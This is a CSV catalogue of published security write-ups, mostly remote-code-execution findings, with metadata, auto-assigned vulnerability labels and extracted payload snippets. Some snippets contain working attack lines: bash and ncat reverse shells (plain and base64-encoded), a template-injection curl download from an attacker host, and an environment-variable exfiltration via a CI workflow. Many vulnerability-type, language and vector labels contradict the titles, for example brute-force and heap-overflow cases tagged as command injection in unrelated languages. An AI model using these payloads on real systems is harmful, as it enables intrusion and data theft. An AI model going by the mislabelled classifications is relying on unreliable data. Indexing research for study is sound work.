Title,URL,Authors,Programs,Bugs,Bounty,PublicationDate,AddedDate,functionality,vulnerability_type,execution_context,attack_vector,language_or_framework,impact,technical_details
VSCode Remote Code Execution advisory,https://blog.ammaraskar.com/vscode-rce/,Ammar Askar,Microsoft VSCode),"RCE, Thick client, Local Privilege Escalation",0,5/30/23,6/5/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"such as this: {     ""experiments"": [       {         ""id"": ""ammar2.test.experiment14"",         ""enabled"": true,         ""schemaVersion"": 5,         ""action2"": {           ""type"": ""Prompt"",           ""properties"": {             ""promptText"": ""[Welcome to VS Code. ...](command:workbench.extensions.installExtension?ms-vscode.hexeditor '.')"",             ""commands"": [               {                 """
Remote Code Execution by Bypassing Cloudflare: CVE-2022–29464 Analysis,https://medium.com/@alii76tt/remote-code-execution-by-bypassing-cloudflare-cve-2022-29464-analysis-02328e0e284a,Ali İltizar (@alii76tt),-,"Components with known vulnerabilities, RCE, WSO2, WAF bypass",0,2/2/24,2/6/24,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"prepared using base64 encoding. This strategy aims to effectively bypass security filters and make the detection of payload more difficult.Payload: sh -i >& /dev/tcp/192.168.1.1/4545 0>&1echo ""c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEvNDU0NSAwPiYxCg=="" > ilto.shReverse shell base64The above command saves the base64 encoded reverse shell command in a file named ilto.sh.The contents of ilto.sh:The con"
Anonymised Penetration Test Report,https://handbook.volkis.com.au/assets/doc/Volkis%20-%20Anonymous%20Client%20-%20Penetration%20Test%20May%202023.pdf,Volkis (@VolkisAU),-,"Internal pentest, RCE, ADCS, Active Directory, Kerberos, DHCPv6, LLMNR",0,5/28/23,5/29/23,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,NodeJS,Full System Compromise,Payload not explicitly detailed
Exploring Three Remote Code Execution Vulnerabilities in RPC Runtime,https://www.akamai.com/blog/security-research/rpc-runtime-exploring-three-vulnerabilities,Ben Barnea (@nachoskrnl),Microsoft (Windows),"RCE, MS-RPC, Integer overflow, Memory corruption",0,5/26/23,5/29/23,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
How I got RCE in one of Bugcrowd's Public Programs,https://medium.com/@yousefmoh15/how-i-got-rce-in-one-of-bugcrowds-public-programs-5725c8dc46ce,Yousef Mohamed Elsaid,-,"RCE, OGNL injection, Apache Struts 2",0,2/3/24,2/6/24,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"I found while searching in labs and write-ups related to Apache Struts 2 and OGNL InjectionThe payload wasRCE Payloadwhich executes the command id on the server, now I added this payload to showLogin.action and sent it as a get request.Suddenly what I never expected happenedAnd this was my reactionNext, I reported this issue to BugCrowd and they triaged it immediately but the program later downgra"
Red team: Journey from RCE to have total control of cloud infrastructure,https://mr-r3bot.github.io/red/team/2023/05/22/From-RCE-to-owning-entire-cloud-infrastructure.html,Quang Vo (@mr_r3bot),-,"RCE, SSTI, Container escape, Kubernetes, Components with known vulnerabilities, CI/CD",0,5/22/23,5/22/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,to gain a reverse shell on client system: ${''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('curl <attacker_host:attacker_port>/backup.sh -o /tmp/backup.sh')
Unveiling a Security Vulnerability in Zoho Meet: Gaining Unauthorized Access to Private Meetings,https://medium.com/@sumitkumardas8487/unveiling-a-security-vulnerability-in-zoho-meet-gaining-unauthorized-access-to-private-meetings-ad428b1990ad,Sumit Kumar,Zoho (Meet),Bruteforce,0,2/4/24,2/27/24,Admin/Config Panel,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"range underscores the significant effort required to brute force the meeting passwords successfully.The lazy Sunday sun peeked through my window as I sat before my computer. An idea sparked in my mind: “Why not try logging into Zoho Meet without a password?” With a quick decision, I created a test account and initiated a meeting.Meeting ID was the only requirement for performing this attack.As I c"
Unauthenticated Remote Command Execution in Multiple WAGO Products,https://onekey.com/blog/security-advisory-wago-unauthenticated-remote-command-execution/,Quentin Kaiser (@QKaiser),WAGO,"RCE, OS command injection, Security code review",0,5/16/23,5/18/23,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
Triple Threat: Breaking Teltonika Routers Three Ways,https://claroty.com/team82/research/triple-threat-breaking-teltonika-routers-three-ways,"Roni Gavrilov, Noam Moshe",Teltonika,"IoT, RCE, OS command injection, SSRF, XSS",0,5/15/23,5/22/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"sent to the /UBUS api route, requesting the UCI config for the widget."
"Pimcore: One click, two security vulnerabilities",https://www.sonarsource.com/blog/pimcore-one-click-two-security-vulnerabilities/,Yaniv Nizry (@YNizry),Pimcore,"Path traversal, SQL injection, Arbitrary file write, RCE, Security code review",0,5/15/23,5/18/23,Imports/Sharing,Command Injection,CI/CD Pipeline RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
Jasper Reports Library Code Injection,https://insinuator.net/2023/06/jasper-reports-library-code-injection/,Dennis Heinze,Jasper Reports,"RCE, SSTI, Insecure deserialization, Security code review",0,6/13/23,6/25/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"that works independently of what tools are installed on the target. In the best case, we would just inject a Java-based reverse shell. But then, there’s the problem that we can only specify Java expressions. No statements. For an interactive reverse shell, we would require at least a loop – which is a statement. I tried to experiment a bit with possible options of how to build a reverse shell with"
Patch Diffing Progress MOVEIt Transfer,https://blog.assetnote.io/2023/06/07/moveit-transfer-patch-diff-adventure/,Dylan Pindur,Progress (MOVEit Transfer),"RCE, SQL injection, Security code review",0,6/13/23,6/27/23,Admin/Config Panel,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,PHP,Full System Compromise,"video below:This blog post will go into some detail about how to get an environment set up to reverse engineer this issue. At a later date, we will be disclosing the proof of concept and steps taken to reproduce the vulnerability.Given that this vulnerability is still being actively exploited, no proof of concept will be published until a public proof of concept becomes available, or 30 days from "
Pwning Admin Panel To Change Movie Ticket Prices at Disney,https://rashahacks.com/pwning-admin-panel-to-change-movie-ticket-prices-at-disney/,Inderjeet Singh (@3nc0d3dGuY),Disney,"Bruteforce, Weak credentials",0,6/14/23,6/25/23,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
Brute-forcing ButterflyMX Virtual Keys and Hacking Time Limits,https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/brute-forcing-butterflymx-virtual-keys-and-hacking-time-limits/,Robert Foggia,ButterflyMX,Bruteforce,0,6/15/23,6/21/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,NodeJS,Shell/Command Execution,Payload not explicitly detailed
An interesting RCE on a Synack Red Team target!,https://d4ly.medium.com/an-interesting-rce-on-a-synack-red-team-target-516edb63fd04,Daly Whyte (@_d4ly_),-,"RCE, Groovy scripting",0,7/11/23,7/12/23,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
Critical Foswiki Vulnerablities: A Logic Error Turned Remote Code Execution,https://herolab.usd.de/en/critical-foswiki-vulnerablities-a-logic-error-turned-remote-code-execution/,Christian Pöschl,Foswiki,"RCE, Privilege escalation, Path traversal",0,7/11/23,7/12/23,File Management,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
How I got Two RCE at EPAM-Bounty Program,https://web.archive.org/web/20230710001307/https://0xbartita.medium.com/how-i-got-two-rce-at-epam-bounty-program-389eb9fc7938,0xBartita (@0xBaRtiTa),EPAM,"SAP, Default credentials, RCE, Groovy scripting",0,7/10/23,7/17/23,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,PHP,Full System Compromise,Payload not explicitly detailed
From Blackbox .NET Remoting to Unauthenticated Remote Code Execution,https://code-white.com/blog/2023-07-from-blackbox-dotnet-remoting-to-rce/,Florian Hauser (@frycos),act!,"RCE, .NET Remoting, Insecure deserialization",0,7/10/23,7/11/23,General Application Logic,Insecure Deserialization,Server-side RCE,Web Application Parameter,.NET,Shell/Command Execution,"(see the switch case mentioned above). sc_TransactionID pointed to the unique transaction session, i.e. it had to stay fixed during the exploitation phase. sc_SharedKey and sc_SharedIV for the symmetric encryption of our exploit payload. These we could extract easily by putting proper breakpoints in the method Act.Framework.Synchronization.Remoting.SecureChannel.SecureClientChannelSink.ProcessShar"
macOS Atlassian Companion Remote Code Execution,https://www.wojciechregula.blog/post/macos-atlassian-companion-rce/,Wojciech Reguła (@_r3ggi),Atlassian,"RCE, MacOS, Thick client",0,7/9/23,7/11/23,User Profile/Content,Command Injection,Desktop App RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
[REL] A Journey Into Hacking Google Search Appliance,https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en/,DEVCORE (@d3vc0r3),Google,"RCE, Line Feed injection, Path traversal, Arbitrary file read, Information disclosure, Security code review",0,7/7/23,7/12/23,Imports/Sharing,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
RCE In GitLab's CLI Tool,http://blog.takemyhand.xyz/2023/07/remote-code-execution-in-gitlabs-cli.html,ameya (@0xtakemyhand),GitLab,"RCE, OS command injection, Security code review",0,7/6/23,7/11/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,"that would do more than just pop calc, I came across the following restrictions"
Story Of My First RCE :),https://medium.com/@0utlawh4ck3r/story-of-my-first-rce-9d74373fbc11,0utlawh4ck3r (@outlawh4ck3r),-,"RCE, Default credentials",0,7/6/23,7/11/23,General Application Logic,Command Injection,Server-side RCE,File Upload Feature,PHP,Shell/Command Execution,Payload not explicitly detailed
Linux local electron application script-src: self bypass,https://mizu.re/post/linux-local-electron-application-script-src-self-bypass#final_bypass,Mizu (@kevin_mizu),-,"Electron, CSP bypass, XSS, RCE",0,7/4/23,7/12/23,Imports/Sharing,Code Injection,Desktop App RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
Encrypted Doesn't Mean Authenticated: ShareFile RCE (CVE-2023-24489),https://blog.assetnote.io/2023/07/04/citrix-sharefile-rce/,Dylan Pindur,Citrix (ShareFile),"RCE, Path traversal, Cryptographic issues, Security code review",0,7/4/23,7/11/23,Imports/Sharing,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"= [         # block 0         b'\x41', b'\x41', b'\x41', b'\x41',         b'\x41', b'\x41', b'\x41', b'\x41',         b'\x41', b'\x41', b'\x41', b'\x41',         b'\x41', b'\x41', b'\x41', i.to_bytes(1, byteorder='little'),"
How We Found Another GitHub Action Environment Injection Vulnerability in a Google Project,https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project,Noam Dotan,Google (Orbit),"CI/CD, RCE",0,7/3/23,7/4/23,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"name: CIon: checksjobs:  job:    runs-on: ubuntu-latest    steps:          - run: echo -e ""11\NODE_OPTIONS=--experimental-modules  --experimental-loader=data:text/javascript,console.log(Buffer.from(JSON.stringify(process.env)).toSt  ring('hex'));//"" >> pr_number.txt          - uses: actions/upload-artifact@v2            name: pr_metadata            path: ./pr_number.txt 3. Open a pull request to b"
Technical Details of CVE-2023-30990 - Unauthenticated RCE in IBM i DDM Service,https://blog.silentsignal.eu/2023/07/03/ibm-i-dde-vulnerability-cve-2023-30990/,pz,IBM,RCE,0,7/3/23,7/4/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
Multiple vulnerabilities on Chamilo 1.11.18,https://www.randorisec.fr/chamilo-1.11.18-multiple-vulnerabilities,Aituglo (@aituglo),Chamilo,"OS command injection, RCE, SSRF, IDOR, XSS, CSRF, Security code review",0,7/1/23,7/17/23,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
Multiple Vulnerabilities In Cockpit CMS <= V2.5.2,https://www.ghostccamm.com/blog/multi_cockpit_vulns/,GhostCcamm (@GhostCcamm),Cockpit CMS,"CSRF, Unrestricted file upload, RCE, XSS, IDOR, Security code review",0,6/30/23,7/12/23,Imports/Sharing,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,PHP,Full System Compromise,"for creating an item.""     )"
Server-side Template Injection Leading to RCE on Google VRP,https://neupanemizzle.medium.com/server-side-template-injection-leading-to-rce-on-google-vrp-75f0a4bc6ebc,mizzleneupane (@mizzle_neupane5),Google,"SSTI, RCE",0,6/30/23,7/4/23,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
CVE-2023-20864: Remote Code Execution In VMware Aria Operations For Logs,https://www.zerodayinitiative.com/blog/2023/6/29/cve-2023-20864-remote-code-execution-in-vmware-aria-operations-for-logs,Dustin Childs,VMware,"RCE, Insecure deserialization, Security code review",0,6/29/23,7/3/23,Admin/Config Panel,Insecure Deserialization,Server-side RCE,Web Application Parameter,Java,Full System Compromise,Payload not explicitly detailed
CVE-2023-26258 – Remote Code Execution in ArcServe UDP Backup,https://www.mdsec.co.uk/2023/06/cve-2023-26258-remote-code-execution-in-arcserve-udp-backup/,"Juan Manuel Fernandez (@TheXC3LL), Sean Doherty",ArcServe,"RCE, Authentication bypass",0,6/28/23,7/3/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Full System Compromise,Payload not explicitly detailed
Auth Bypass Round Two,https://www.assetnote.io/resources/research/ivantis-pulse-connect-secure-auth-bypass-round-two,Dylan Pindur,Ivanti,"SAML, SSRF, RCE, Authentication bypass, Security code review",0,2/2/24,2/6/24,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"to modify and try different things with. While trying some XXE payloads we came across an error: <span class=""code_single-line"">Unknown issuer value in response</span>. We searched the filesystem for any matches to see where this error was coming from as it wasn't in anything we had seen so far. $ grep -ir 'Unknown issuer value in response' . Binary file ./home/bin/saml-server matches"
Why ORMs and Prepared Statements Can't (Always) Win,https://www.sonarsource.com/blog/why-orms-and-prepared-statements-cant-always-win/,Thomas Chauchefoin (@swapgs),"Soko, Gentoo Linux","SQL injection, RCE, Security code review",0,6/26/23,7/12/23,Admin/Config Panel,Command Injection,CI/CD Pipeline RCE,Web Application Parameter,PHP,Shell/Command Execution,has to respect several constraints:
My First Bug is RCE via SQL injection!,https://medium.com/@karimelsayed0x1/my-first-bug-is-rce-via-sql-injection-dfee9c4d4c01,z3r0xk (@z3r01k),-,"SQL injection, RCE",0,6/23/23,6/25/23,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
RCE via Path Traversal vulnerability in Onlyoffice CommunityServer < 12.5.2 (CVE-2023-34939),https://github.com/firsov/onlyoffice/blob/main/CVE-2023-34939-PoC.md,Kirill Firsov (@k_firsov),OnlyOffice,"Path traversal, RCE",0,6/19/23,7/4/23,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
chonked pt.1: minidlna 1.3.2 http chunk parsing heap overflow (cve-2023-33476) root cause analysis,https://blog.coffinsec.com/0day/2023/05/31/minidlna-heap-overflow-rca.html,hyper (@hyprdude),MiniDLNA,"Memory corruption, Heap overflow, Buffer Overflow, RCE",0,6/19/23,6/27/23,User Profile/Content,Command Injection,Server-side RCE,Web Application Parameter,NodeJS,Full System Compromise,Payload not explicitly detailed
FortiNAC - Just a few more RCEs,https://frycos.github.io/vulns4free/2023/06/18/fortinac.html,Florian Hauser (@frycos),Fortinet,"RCE, XXE, Insecure deserialization, OS command injection, Argument injection, Security code review",0,6/18/23,6/21/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"for a reverse shell over a ncat SSL connection: java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 ""bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMzcuMC4xNi8xMzM3IDA+JjE=}|{base64,-d}|{bash,-i}"" | ncat --ssl 10.137.0.34 1050"
What is kong & why we’re relying on it,https://thinkloveshare.com/hacking/kong-konga-exploitation-and-hardening/,Laluka (@TheLaluka),Konga,"RCE, Sandbox escape, Authentication bypass, Hardcoded credentials, Broken Access Control, Privilege escalation, JWT",0,5/10/23,5/12/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"we want to put inside the token         process.env.TOKEN_SECRET || ""oursecret"" // Secret string which will be used to sign the token );"
Form Tools Remote Code Execution: We Need To Talk About PHP,https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/,watchTowr (@watchtowrcyber),-,"RCE, LFI, Security code review",0,2/8/24,2/27/24,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
Gitpod remote code execution 0-day vulnerability via WebSockets,https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/,Elliot Ward,Gitpod,"RCE, Websockets, Cross-Site WebSocket Hijacking (CSWH), Cloud, Samesite cookie bypass, Account takeover",0,3/1/23,3/2/23,Imports/Sharing,Server-Side Template Injection (SSTI),Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"that grants us full control over the user’s workspaces when an unsuspecting Gitpod user visits our link!Here it is in action:We can see that we’ve been able to extract some sensitive information about the user account, and are notified that our SSH key has been added to the account. Let's see if we can SSH to the workspace:Mission successful! As shown above, we have full access to the user’s works"
SSTI leads to RCE on PyroCMS,https://cupc4k3.lol/ssti-leads-to-rce-on-pyrocms-7515be27c811,cupc4k3,PyroCMS,"SSTI, RCE",0,3/20/23,3/23/23,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
Riding the Azure Service Bus (Relay) into Power Platform,https://www.netspi.com/blog/technical/vulnerability-research/azure-service-bus-power-platform/,Nick Landers (@monoxgas),Microsoft (Azure),"RCE, Cross-tenant vulnerability, Cloud, Insecure deserialization",0,3/30/23,3/31/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,.NET,Shell/Command Execution,"in a RelayPacketHeader and deliver it using TransferCallbackAsync. Getting the Power Platform to communicate with the fake gateway is straight-forward. We set up a fresh Logic App, select one of the on-prem supported connectors, and trigger any activity against our gateway (test connection, store credentials, query data, etc.). You can find the proof-of-concept on Github and the relevant code belo"
It’s a (SNMP) Trap: Gaining Code Execution on LibreNMS,https://www.sonarsource.com/blog/it-s-a-snmp-trap-gaining-code-execution-on-librenms/,Stefan Schiller (@scryh_),LibreNMS,"RCE, Stored XSS, Security code review",0,3/29/23,3/31/23,Imports/Sharing,Command Injection,CI/CD Pipeline RCE,Web Application Parameter,PHP,Shell/Command Execution,"in the eventlog (2). When an admin views the eventlog dashboard via the web interface (3), the triggered JavaScript payload leverages the Alert Template feature to create a new Blade template (4), which executes arbitrary PHP code e.g., to establish a reverse shell (5):"
Attacking Visual Studio for Initial Access,https://www.outflank.nl/blog/2023/03/28/attacking-visual-studio-for-initial-access/,Stan Hegt (@StanHacked),Microsoft (Visual Studio),"Phishing, 1-click RCE, Watering hole attack",0,3/28/23,2/6/24,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,GeneratorToolingTradecraftDemo Videos  Cobalt StrikeRed Team BundleAdvanced Red Team Bundle Red Team ServicesBlog & Resources
How I escalated default credentials to Remote Code Execution,https://pawanchhabria.medium.com/how-i-escalated-default-credentials-to-remote-code-execution-1c34504be7a5,Pawan Chhabria (@heybenchmarkkk),-,"Default credentials, RCE",0,3/26/23,3/28/23,Imports/Sharing,Unrestricted File Write/Upload,Server-side RCE,API Endpoint,Java,Shell/Command Execution,Payload not explicitly detailed
Hacking AI: System and Cloud Takeover via MLflow Exploit,https://protectai.com/blog/hacking-ai-system-takeover-exploit-in-mlflow,Dan McInerney (@DanHMcInerney),MLflow,"LFI, RFI, RCE",0,3/25/23,3/31/23,Imports/Sharing,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,Python,Shell/Command Execution,"the source parameters of the model version with a local or remote file path. Then when they called get-artifact on the model version, they could specify a file in the payloaded path. Setting source to file:///etc/ then requesting an artifact filename of passwd would dump the local or remote server’s /etc/passwd file. The MLflow team patched it in this commit. March 27th, 2023 - Patch Bypass #1 Hun"
Joomla! CVE-2023-23752 to Code Execution,https://vulncheck.com/blog/joomla-for-rce,Jacob Baines (@Junior_Baines),Joomla!,"Broken Access Control, RCE",0,3/23/23,3/31/23,Imports/Sharing,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"above, the server responds with the credentials root:labpass1, which are the credentials for our test Joomla! MySQL account. But it’s important to know that our test MySQL server was bound to 127.0.0.1, so the remote attacker can’t access the server, making the credentials mostly useless. Binding MySQL to the localhost should be the most common configuration, which severely limits this credential "
Exploiting prototype pollution in Node without the filesystem,https://portswigger.net/research/exploiting-prototype-pollution-in-node-without-the-filesystem,Gareth Heyes (@garethheyes),-,"Server-side prototype pollution, RCE",0,3/23/23,3/28/23,Imports/Sharing,Server-Side Template Injection (SSTI),Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"to solve the lab?""__proto__"":{   ""NODE_OPTIONS"": ""--import=\""data:text/javascript,import dns from 'node:dns';dns.lookup('YOUR_COLLABORATOR_ID.oastify.com', x=>1)\""""}"
Escalating Privileges with Azure Function Apps,https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-function-apps/,Karl Fosaaen (@kfosaaen),Microsoft (Azure),"Privilege escalation, Cloud, Container escape, RCE",0,3/23/23,3/28/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Python,Shell/Command Execution,Payload not explicitly detailed
Finding Initial Access on a real life Penetration Test,https://medium.com/@warrenbutterworth/finding-initial-access-on-a-real-life-penetration-test-86ed5503ae48,Warren Butterworth (@w88ugs),-,"Old components with known vulnerabilities, Internal pentest, RCE",0,3/23/23,3/28/23,File Management,Command Injection,Server-side RCE,Web Application Parameter,.NET,Shell/Command Execution,"(my CS Beacon) into memory. After hosting the bin file, uploading and running the exe I was presented with a High integrity beacon for CobaltStrike. From here a DCSYNC of the krbtgt NTLM/AES hash gave me domain dominance.I hope you find this writeup helpful.Feel free to connect on linkedinPenetration TestingCybersecurityRed TeamingInformation Security----FollowWritten by Warren Butterworth57 follo"
Getting Root - A Technical Walkthrough,https://occamsec.com/getting-root-a-technical-walkthrough/,OccamSec (@occamsec),-,"Information disclosure, LFI, RCE, Local Privilege Escalation",0,3/22/23,6/27/23,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
JMX Exploitation Revisited,https://codewhitesec.blogspot.com/2023/03/jmx-exploitation-revisited.html,"Markus Wulftange (@mwulftange), Tobias Neitzel (@qtc_de)",-,"RCE, JMX",0,3/20/23,3/23/23,Admin/Config Panel,Insecure Deserialization,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
Remote code execution in BIRT Viewer ≤ 4.12.0 (CVE-2023-0100),https://www.synacktiv.com/sites/default/files/2023-03/Synacktiv-BIRTViewer-CVE-2023-0100_1.pdf,Louis Wolfers (@TG91aXMK),Eclipse Foundation,"RCE, RFI, URL validation bypass, Security code review",0,3/17/23,5/8/23,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,.NET,Shell/Command Execution,Payload not explicitly detailed
PwnAssistant - Controlling /home's Via A Home Assistant RCE,https://www.elttam.com/blog/pwnassistant/,elttam (@elttam),Home Assistant,"Authentication bypass, RCE, Security code review, IoT",0,5/9/23,5/11/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Python,Shell/Command Execution,"is used. We also noted the Bluetooth and USB integrations to have some interesting attack surface for an attacker with physical proximity to a Home Assistant installation. We didn’t end up spending too much time hunting for bugs in the local attack surface exposed via auto-discovery, partly due to the attack surface provided by the web application being just as interesting while also having a high"
Emotional Rollercoaster: A Unique Case Study of Bypassing Antivirus and Firewall by Abusing PostgreSQL,https://medium.com/@yousefamery/emotional-rollercoaster-a-unique-case-study-of-bypassing-antivirus-and-firewall-by-abusing-2b36d8f6553c,Yousef Amery (@YousefAmery),-,"RCE, Old components with known vulnerabilities",0,3/15/23,3/15/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"and uploads it using the below command:Notice how it uses the (/**/) bypass we discussed earlier, with the (INSERT) command.Then it exports the WAR file to a known directory (……/tomcat/webapps/):And Metasploit will actually request us to delete this file manually, and give us its name and path:Lastly, Metasploit will send multiple requests to this newly created file to trigger a deployment for it "
Backend Parameter Injection --> RCE,http://blog.sysdum.net/parameter-injection-to-rce,Austin (@systemdumb),-,"RCE, HTTP parameter pollution, OS command injection",0,3/14/23,6/13/23,File Management,Command Injection,Server-side RCE,Web Application Parameter,NodeJS,Shell/Command Execution,"using Burp Collaborator: -------------------------384837281 Content-Disposition: form-data; name=""frequency"""
Producing a POC for CVE-2022-42475 (Fortinet RCE),https://blog.scrt.ch/2023/03/14/producing-a-poc-for-cve-2022-42475-fortinet-rce/,Alain Mowat (@plopz0r),Fortinet,"Memory corruption, RCE, Integer overflow, Heap overflow",0,3/14/23,3/15/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Python,Shell/Command Execution,"was already several hundreds of thousands of characters long and it took me a shocking amount of time to actually get the right offset, mostly because all pattern generators have a quite limited number of maximum characters. Anyways, I eventually found the right offset, made it point to a readable memory region and finally got to a different crash which looked very similar to the one the Chinese t"
The story of how I was able to chain SSRF with Command Injection Vulnerability,https://medium.com/@rajqureshi07/the-story-of-how-i-was-able-to-chain-ssrf-with-command-injection-vulnerability-ef31feb30ea9,Raj Qureshi (@RajQureshi9),-,"SSRF, OS command injection, RCE",0,3/12/23,3/15/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
CVE-2022-36413 Unauthorized Reset Password of Zoho ManageEngine ADSelfService Plus,https://noahblog.360.cn/cve-2022-36413-unauthorized-reset-password-of-zoho-manageengine-adselfservice-plus/,Sky,Zoho (ManageEngine),"Password reset, OTP bruteforce, Account takeover, Authentication bypass",0,3/10/23,3/23/23,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
EJS - Server Side Prototype Pollution gadgets to RCE,https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce,Mizu (@kevin_mizu),Node.js third-party modules (EJS),"Server-side prototype pollution, RCE, Security code review",0,3/9/23,3/10/23,Imports/Sharing,Command Injection,Desktop App RCE,Third-party Library,NodeJS,Shell/Command Execution,Payload not explicitly detailed
CorePlague: Severe Vulnerabilities in Jenkins Server Lead to RCE,https://blog.aquasec.com/jenkins-server-vulnerabilities,"Ilay Goldman (@GoldmanIlay), Yakir Kadkoda",Jenkins,"RCE, XSS, Security code review",0,3/8/23,3/10/23,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
PwnAgent: A One-Click WAN-side RCE in Netgear RAX Routers with CVE-2023-24749,https://mahaloz.re/2023/02/25/pwnagent-netgear.html,"Zion Basque (@mahal0z), Wil Gibbs (@cl4sm)",Netgear,"RCE, OS command injection, Security code review",0,3/8/23,3/10/23,Imports/Sharing,Command Injection,Server-side RCE,API Endpoint,Java,Shell/Command Execution,Payload not explicitly detailed
